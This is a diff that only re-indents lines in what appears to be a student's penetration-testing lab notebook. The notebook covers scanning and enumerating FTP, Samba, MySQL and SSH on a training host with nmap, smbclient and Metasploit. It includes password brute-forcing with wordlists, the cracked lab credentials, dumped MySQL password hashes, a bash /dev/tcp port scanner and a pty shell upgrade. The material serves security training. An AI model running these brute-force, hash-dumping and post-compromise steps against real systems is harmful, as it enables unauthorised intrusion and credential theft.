@@ -97,21 +97,21 @@
 	file /root/static-binaries/nmap
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nano bash-port-scanner.sh
-	#!/bin/bash
-	for port in {1..1000}; do
-	 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
-	done
+		#!/bin/bash
+		for port in {1..1000}; do
+		 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+		done
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	sessions -i 1
 		upload /root/static-binaries/nmap /tmp/nmap
 		upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
 	
 	shell
-	python3 -c 'import pty;pty.spawn("/bin/bash")'
+		python3 -c 'import pty;pty.spawn("/bin/bash")'
 	cd /tmp/
-	chmod +x ./nmap ./bash-port-scanner.sh
-	./bash-port-scanner.sh 192.143.222.3
-	./nmap -p- 192.143.222.3
+		chmod +x ./nmap ./bash-port-scanner.sh
+		./bash-port-scanner.sh 192.143.222.3
+		./nmap -p- 192.143.222.3
 
 ## FTP Enumeration
 	msfconsole
@@ -138,33 +138,33 @@
 
 ## Samba Recon: Basics
 	Find the default tcp ports used by smbd:
-	=> nmap demo.ine.local
+		=> nmap demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Find the default udp ports used by nmbd:
-	=> nmap -sU --top-ports 25 demo.ine.local
+		=> nmap -sU --top-ports 25 demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	What is the workgroup name of samba server?
-	=> nmap -sV -p 445 demo.ine.local
+		=> nmap -sV -p 445 demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Find the exact version of samba server by using appropriate nmap script
 	What is the NetBIOS computer name of samba server?
-	=> nmap --script smb-os-discovery.nse -p 445 demo.ine.local
+		=> nmap --script smb-os-discovery.nse -p 445 demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Find the exact version of samba server by using smb_version metasploit module
-	=> msfconsole -q
-	use auxiliary/scanner/smb/smb_version
-	set RHOSTS demo.ine.local
-	exploit
+		=> msfconsole -q
+		use auxiliary/scanner/smb/smb_version
+		set RHOSTS demo.ine.local
+		exploit
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Find the NetBIOS computer name of samba server using nmblookup
-	=> nmblookup -A demo.ine.local
+		=> nmblookup -A demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Using smbclient determine whether anonymous connection (null session) is allowed on the samba server or not
 	（空會話） | IPC$
-	=> smbclient -L demo.ine.local -N
+		=> smbclient -L demo.ine.local -N
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not.
-	=> rpcclient -U "" -N demo.ine.loca
+		=> rpcclient -U "" -N demo.ine.loca
 		rpcclient $> l
 	允許匿名連接 : 在沒有任何憑證的情況下連接到 samba 伺服器時不會引發錯誤
 ## Apache Enumeration
@@ -259,33 +259,33 @@
 	nmap demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
-	use auxiliary/scanner/mysql/mysql_version
-	set RHOSTS demo.ine.local
-	run
+		use auxiliary/scanner/mysql/mysql_version
+		set RHOSTS demo.ine.local
+		run
 	[+] 192.211.100.3:3306 - 192.211.100.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/mysql/mysql_login
-	set RHOSTS demo.ine.local
-	set USERNAME root
-	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
-	set VERBOSE false
-	run
+		set RHOSTS demo.ine.local
+		set USERNAME root
+		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+		set VERBOSE false
+		run
 	[+] 192.211.100.3:3306    - 192.211.100.3:3306 - Success: 'root:twinkle'   
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/admin/mysql/mysql_enum
-	set USERNAME root
-	set PASSWORD twinkle
-	set RHOSTS demo.ine.local
-	run
+		set USERNAME root
+		set PASSWORD twinkle
+		set RHOSTS demo.ine.local
+		run
 
 	List of Accounts with Password Hashes:
 	[+] 192.211.100.3:3306 -      User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/admin/mysql/mysql_sql
-	set USERNAME root
-	set PASSWORD twinkle
-	set RHOSTS demo.ine.local
-	run
+		set USERNAME root
+		set PASSWORD twinkle
+		set RHOSTS demo.ine.local
+		run
 
 	[*] 192.211.100.3:3306 - Sending statement: 'select version()'...
 	[*] 192.211.100.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |
@@ -293,31 +293,31 @@
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/mysql/mysql_file_enum
-	set USERNAME root
-	set PASSWORD twinkle
-	set RHOSTS demo.ine.local
-	set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
-	set VERBOSE true
-	run
+		set USERNAME root
+		set PASSWORD twinkle
+		set RHOSTS demo.ine.local
+		set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+		set VERBOSE true
+		run
 
 	[+] 192.211.100.3:3306 - /tmp is a directory and exists
 	[+] 192.211.100.3:3306 - /etc/passwd is a file and exists
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/mysql/mysql_hashdump
-	set USERNAME root
-	set PASSWORD twinkle
-	set RHOSTS demo.ine.local
-	run
+		set USERNAME root
+		set PASSWORD twinkle
+		set RHOSTS demo.ine.local
+		run
 
 	[+] 192.211.100.3:3306 - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF2554B2540144
 	[+] 192.211.100.3:3306 - Saving HashString as Loot: debian-sys-maint:*F4E71A0BE028B3688230B992EEAC70BC598FA723
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/mysql/mysql_schemadump
-	set USERNAME root
-	set PASSWORD twinkle
-	set RHOSTS demo.ine.local
-	run
+		set USERNAME root
+		set PASSWORD twinkle
+		set RHOSTS demo.ine.local
+		run
 
 	- DBName: upload
 	  Tables: []
@@ -331,11 +331,11 @@
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/mysql/mysql_writable_dirs
-	set RHOSTS demo.ine.local
-	set USERNAME root
-	set PASSWORD twinkle
-	set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
-	run
+		set RHOSTS demo.ine.local
+		set USERNAME root
+		set PASSWORD twinkle
+		set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+		run
 
 	[+] 192.211.100.3:3306 - /tmp is writeable
 	[+] 192.211.100.3:3306 - /root is writeable
@@ -345,9 +345,9 @@
 	nmap -sS -sV demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	msfconsole -q
-	use auxiliary/scanner/ssh/ssh_version
-	set RHOSTS demo.ine.local
-	exploit
+		use auxiliary/scanner/ssh/ssh_version
+		set RHOSTS demo.ine.local
+		exploit
 
 	  service.family           OpenSSH
 	  service.product          OpenSSH
@@ -357,12 +357,12 @@
 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
 	use auxiliary/scanner/ssh/ssh_login
-	set RHOSTS demo.ine.local
-	set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
-	set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
-	set STOP_ON_SUCCESS true
-	set VERBOSE true
-	exploit
+		set RHOSTS demo.ine.local
+		set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+		set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+		set STOP_ON_SUCCESS true
+		set VERBOSE true
+		exploit
 
 	[+] 192.220.149.3:22 - Success: 'sysadmin:hailey' 'uid=1000(sysadmin) gid=1000(sysadmin) groups=1000(sysadmin) Linux demo.ine.local 6.8.0-39-generic #39-Ubuntu SMP PREEMPT_DYNAMIC Fri Jul  5 21:49:14 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux '
 	~~~~~~~~~~~~~~~~~~~~~~~~~~
